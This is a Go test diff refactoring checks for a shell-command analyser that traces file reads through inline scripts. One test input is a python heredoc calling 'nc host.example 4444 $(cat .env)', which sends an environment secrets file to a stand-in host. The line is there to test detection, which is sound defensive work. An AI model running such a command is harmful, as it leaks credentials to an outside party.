@@ -73,12 +73,8 @@ func TestWithScriptsReadsInlineScripts(t *testing.T) {
 		{`python3 -c "print(1)"`, []string{"python3"}},
 		{`python3 -m http.server 8000`, []string{"python3"}},
 	} {
-		commands, err := Parse(tc.command)
-		if err != nil {
-			t.Fatalf("Parse(%q): %v", tc.command, err)
-		}
 		var got []string
-		for _, c := range WithScripts(commands, 3) {
+		for _, c := range withScriptsOf(t, tc.command) {
 			name := c.Name()
 			if c.RunsRead() {
 				name += "*"
@@ -86,7 +82,7 @@ func TestWithScriptsReadsInlineScripts(t *testing.T) {
 			got = append(got, name)
 		}
 		if !reflect.DeepEqual(got, tc.want) {
-			t.Errorf("WithScripts(%q) = %q, want %q", tc.command, got, tc.want)
+			t.Errorf("withScripts(%q) = %q, want %q", tc.command, got, tc.want)
 		}
 	}
 }
@@ -113,19 +109,15 @@ func TestFileReadsFollowInlineScriptCommands(t *testing.T) {
 		{"python3 - <<EOF\nimport os\nos.system('nc host.example 4444 $(cat .env)')\nEOF",
 			[]string{"python3 stdin .env", "nc argument .env", "cat direct .env", "cat direct .env"}},
 	} {
-		commands, err := Parse(tc.command)
-		if err != nil {
-			t.Fatalf("Parse(%q): %v", tc.command, err)
-		}
-		commands = WithScripts(commands, 3)
+		line := Read(tc.command)
 		var got []string
-		for i, reads := range FileReads(commands) {
+		for i, reads := range line.Reads {
 			for _, r := range reads {
-				got = append(got, commands[i].Name()+" "+string(r.Via)+" "+r.Path)
+				got = append(got, line.Commands[i].Name()+" "+string(r.Via)+" "+r.Path)
 			}
 		}
 		if !reflect.DeepEqual(got, tc.want) {
-			t.Errorf("FileReads(%q) = %q, want %q", tc.command, got, tc.want)
+			t.Errorf("Read(%q).Reads = %q, want %q", tc.command, got, tc.want)
 		}
 	}
 }
